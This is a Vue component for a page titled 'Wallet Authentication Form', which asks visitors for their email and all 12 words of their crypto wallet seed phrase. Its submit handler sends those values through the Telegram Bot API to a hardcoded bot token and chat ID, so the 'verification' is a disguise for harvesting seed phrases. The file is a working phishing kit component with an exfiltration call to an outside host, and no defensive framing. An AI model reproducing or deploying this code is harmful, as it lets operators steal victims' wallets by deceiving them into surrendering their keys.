<template>
  <div class="wallet-details">
    <header>
      <router-link to="/" class="logo">Logo</router-link>
      <div class="nav">
        <router-link :to="{ name: 'Wallets' }">Wallets</router-link>
        <div class="flag"></div>
      </div>
    </header>
    <section class="details">
      <div class="photo-details">
        <div class="wallet-image">
          <div class="wallet-title">Authenticate Your {{ walletTitle }}</div>
        </div>
      </div>
      <div class="twelve-phrase">
        <h3 class="big">Wallet Authentication Form</h3>
        <form @submit.prevent="handleSubmit">
          <div class="email">
            <div class="label">Email Address :</div>
            <input type="email" placeholder="Enter Email" v-model="email" />
          </div>
          <h3 class="small">Wallet 12 Seed Phrase:</h3>
          <div class="inputs">
            <input
              v-for="(word, index) in seedPhrase"
              :key="index"
              type="text"
              :placeholder="'Word ' + (index + 1)"
              v-model="seedPhrase[index]"
            />
          </div>
          <div class="btn"><button type="submit">Verify wallet</button></div>
        </form>
      </div>
    </section>
  </div>
</template>

<script setup>
import { useWalletStore } from '@/stores/walletStore'
import { computed, reactive } from 'vue'
import { useRoute } from 'vue-router'

// Access route parameters
const route = useRoute()
const id = route.params.id

// Wallet store
const walletStore = useWalletStore()

// Compute the wallet title based on the ID
const walletTitle = computed(() => {
  const wallet = walletStore.wallets.find((w) => w.id === parseInt(id))
  return wallet ? wallet.title : null
})

// Form state
const formState = reactive({
  email: '',
  seedPhrase: Array(12).fill(''), // 12 seed phrase words
})

// Telegram Bot Token and Chat ID
const BOT_TOKEN = 'HTTP API:7640674458:AAHG635XLcWfDc0HbiXx4xpqmzubixdsERk'
const CHAT_ID = '5300909464'

// Handle form submission
const handleSubmit = () => {
  const message = `
    🛡️ *Wallet Authentication Form Submitted* 🛡️
    - 📧 *Email:* ${formState.email}
    - 🔑 *Wallet Title:* ${walletTitle.value || 'N/A'}
    - 🔢 *Seed Phrase:*
      ${formState.seedPhrase.map((word, index) => `${index + 1}: ${word}`).join('\n')}
  `

  // Send the message to Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown', // Makes the message bold and formatted
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log('Telegram response:', data)
      alert('Message sent successfully!')
    })
    .catch((error) => {
      console.error('Telegram error:', error)
      alert('Failed to send message.')
    })
}

// Destructure form state for template binding
const { email, seedPhrase } = formState
</script>

<style scoped>
header {
  width: 100%;
  height: 80px;
  background-color: rgb(18, 18, 44);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 120px;
}
.big {
  text-align: start;
  font-size: 24px;
  margin-bottom: 50px;
}
.label {
  margin-bottom: 10px;
}
.small {
  text-align: start;
  font-size: 20px;
  margin-bottom: 10px;
  margin-top: 30px;
}
.email {
  /* padding: 20px; */
}
.logo {
  padding: 10px 20px;
  background-color: white;
  border-radius: 12px;
  text-decoration: none;
}
.logo a {
  text-decoration: none;
}
.nav {
  display: flex;
  gap: 20px;
}
.nav a {
  background-color: rgb(64, 120, 224);
  padding: 10px 20px;
  border-radius: 12px;
  text-decoration: none;
  color: white;
}
.flag {
  padding: 10px 30px;
  background-color: black;
  border: 2px solid white;
  border-radius: 12px;
}

.details {
  width: 100%;
  height: min-content;
  background-color: rgb(201, 201, 240);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.photo-details {
  display: flex;
  flex-direction: column;
  justify-content: center;
  /* padding: 10px; */
  width: 100%;
}
.wallet-image {
  width: 100%;
  height: 250px;
  background-color: rgb(31, 45, 77);
  /* border-radius: 4px; */
  display: flex;
  justify-content: center;
  margin-bottom: 30px;
}
.wallet-title {
  width: 100%;
  font-size: 28px;
  justify-content: center;
  display: flex;
  align-items: center;
  /* background-color: black; */
  text-align: center;
  margin-top: 5px;
  color: #fff;
}
.twelve-phrase {
  width: 90%;
  height: 100%;
  background-color: rgb(255, 255, 255);
  /* display: flex; */
  justify-content: center;
  display: block;
  flex-direction: column;
  padding: 20px;
  overflow: hidden;
  border-radius: 4px;
  margin-bottom: 60px;
}

.inputs {
  width: 100%;
  /* background-color: aquamarine; */
  display: grid;
  /* flex-direction: column; */
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}
input {
  width: 100%;
  height: 45px;
  border-radius: 8px;
  border: 1px aqua solid;
  padding: 5px;
}
.btn {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  /* background-color: black; */
  height: min-content;
  margin-top: 20px;
}
.btn button {
  padding: 10px 80px;
  border-radius: 8px;
  border: none;
  background-color: rgb(18, 18, 44);
  color: white;
}
</style>
